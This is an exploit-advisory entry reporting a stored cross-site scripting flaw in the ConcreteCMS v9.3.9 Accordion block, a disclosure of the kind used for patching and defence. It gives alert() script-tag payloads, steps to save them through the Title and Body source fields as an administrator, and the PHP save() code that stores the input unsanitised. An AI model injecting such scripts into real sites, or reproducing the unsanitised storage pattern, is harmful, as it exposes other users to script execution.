# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
## Date: 3/13/2025
## Vendor Homepage: https://github.com/concretecms/concretecms
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Concretecms
## Version: v9.3.9
## Exploit Description:
## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Title field、Body source field when adding a Accordion block. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------

```
<script>alert('Title');</script>
<script>alert('Body Source');</script>
```

1. Use administrator login
2. Click "add content to the page" in the top navigation.
3. Select the Accordion , drag and drop it to the page.
4. Add <script>alert('...');</script> to the Title field、Body source field and then click save,the xss vulnerability appears.

Potentially problematic source code:
```php
public function save($args)
    {
        parent::save($args);

        /** @var Connection $db */
        $db = $this->app->make(Connection::class);
        $db->executeStatement('DELETE FROM btAccordionEntries WHERE bID = ?', [$this->bID]);
        $entries = $this->processJson($args);

        if ($entries) {
            $sortOrder = 0;
            foreach ($entries as $entry) {
                // Add the entry row
                if (isset($entry['description'])) {
                    $entry['description'] = LinkAbstractor::translateTo($entry['description']);
                }
                $db->executeStatement(
                    'INSERT INTO btAccordionEntries (bID, sortOrder, title, description) VALUES (?, ?, ?, ?)',
                    [(int)$this->bID, $sortOrder++, $entry['title'], $entry['description']]
                );
            }
        }
    }
```